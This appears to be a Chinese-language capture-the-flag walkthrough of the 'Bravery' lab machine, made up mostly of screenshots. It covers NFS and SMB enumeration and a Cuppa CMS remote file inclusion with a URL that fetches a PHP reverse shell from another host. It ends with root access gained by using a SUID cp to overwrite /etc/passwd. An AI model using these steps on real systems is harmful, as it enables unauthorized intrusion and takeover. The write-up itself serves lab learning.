# Bravery



![image-20200611023042725](assets/Bravery.assets/image-20200611023042725.png)



![image-20200611023445556](assets/Bravery.assets/image-20200611023445556.png)



![image-20200611023523893](assets/Bravery.assets/image-20200611023523893.png)



![image-20200611030502540](assets/Bravery.assets/image-20200611030502540.png)



![image-20200611030409992](assets/Bravery.assets/image-20200611030409992.png)

```bash
mkdir nfs
sudo mount -t nfs 192.168.43.175:/var/nfsshare nfs
```

![image-20200611032610166](assets/Bravery.assets/image-20200611032610166.png)

![image-20200611032653581](assets/Bravery.assets/image-20200611032653581.png)

```bash
qwertyuioplkjhgfdsazxcvbnm
```

---

smb

```bash
enum4linux 192.168.43.175
```

![image-20200611032941272](assets/Bravery.assets/image-20200611032941272.png)



![image-20200611032902030](assets/Bravery.assets/image-20200611032902030.png)

```bash
smbclient --no-pass //192.168.43.175/anonymous
```

![image-20200611033137230](assets/Bravery.assets/image-20200611033137230.png)

anonymous 可以匿名连接但是没什么有价值的东西。

secured 不可以匿名连接，使用-u实验一下已知的用户名，已经发现的可能是密码的字符串

```bash
smbclient //192.168.43.175/ -U david
```

![image-20200611034208068](assets/Bravery.assets/image-20200611034208068.png)

![image-20200611034430762](assets/Bravery.assets/image-20200611034430762.png)

![image-20200611034718681](assets/Bravery.assets/image-20200611034718681.png)

逐个浏览

![image-20200611041235178](assets/Bravery.assets/image-20200611041235178.png)



![image-20200611041308125](assets/Bravery.assets/image-20200611041308125.png)



cuppa cms



![image-20200611041608266](assets/Bravery.assets/image-20200611041608266.png)



很多漏洞。选最简单的，远程文件包含

![image-20200611041708993](assets/Bravery.assets/image-20200611041708993.png)

拉shell，改文件名后缀为.txt

```bash
http://192.168.1.112/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.1.108:8080/php-reverse-shell.txt
```

![image-20200611080504082](assets/Bravery.assets/image-20200611080504082.png)

基础枚举后发现cp 拥有SUID

![image-20200611084548532](assets/Bravery.assets/image-20200611084548532.png)



![image-20200611084833422](assets/Bravery.assets/image-20200611084833422.png)



先复制passwd到本地生成，复制root的信息到最后一行，

![image-20200611085117882](assets/Bravery.assets/image-20200611085117882.png)

利用openssl生成新用户evil的hash

![image-20200611085830450](assets/Bravery.assets/image-20200611085830450.png)

替换掉对应的用户名位和密码位

![image-20200611085903502](assets/Bravery.assets/image-20200611085903502.png)

上传到可写目录tmp

![image-20200611090145720](assets/Bravery.assets/image-20200611090145720.png)

利用cp替换

![image-20200611090259930](assets/Bravery.assets/image-20200611090259930.png)

su evil

![image-20200611090403674](assets/Bravery.assets/image-20200611090403674.png)

